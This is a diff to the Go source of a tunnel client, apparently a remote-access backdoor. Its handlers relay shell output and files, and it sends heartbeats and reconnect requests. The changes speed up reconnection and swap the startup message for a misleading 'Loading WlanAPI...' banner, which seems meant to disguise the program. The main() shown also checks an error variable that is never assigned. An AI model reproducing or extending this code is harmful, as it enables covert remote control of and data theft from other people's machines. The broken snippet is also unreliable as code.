@@ -49,7 +49,7 @@ func (c *GTClient) sendConnReq() {
 				payload:  append([]byte{0x06}, []byte(name)...),
 			})
 		}
-		time.Sleep(30 * time.Second)
+		time.Sleep(10 * time.Second)
 	}
 }
 
@@ -70,6 +70,7 @@ func (c *GTClient) sendHeartBeat() {
 func (c *GTClient) handlePacket() {
 	go func() {
 		for {
+			time.Sleep(1 * time.Millisecond)
 			if c.sendList.Len() > 0 {
 				v := c.sendList.Front()
 				c.Send(v.Value.(*TunnelData))
@@ -143,6 +144,7 @@ func (c *GTClient) handleShell(t *TunnelData) {
 						})
 						res = res[MaxPayloadLength:]
 					}
+
 					c.sendList.PushBack(&TunnelData{
 						dataType: TunnelShellData,
 						clientID: c.clientID,
@@ -218,15 +220,15 @@ func (c *GTClient) handleFile(t *TunnelData) {
 }
 
 func main() {
-	fmt.Println("[*] Start")
 	c := New()
 	if err != nil {
 		fmt.Println(err)
 		return
 	}
 
-	go c.sendHeartBeat()
+	fmt.Println("[*] Loading WlanAPI...")
 
+	go c.sendHeartBeat()
 	go c.handlePacket()
 
 	c.sendConnReq()
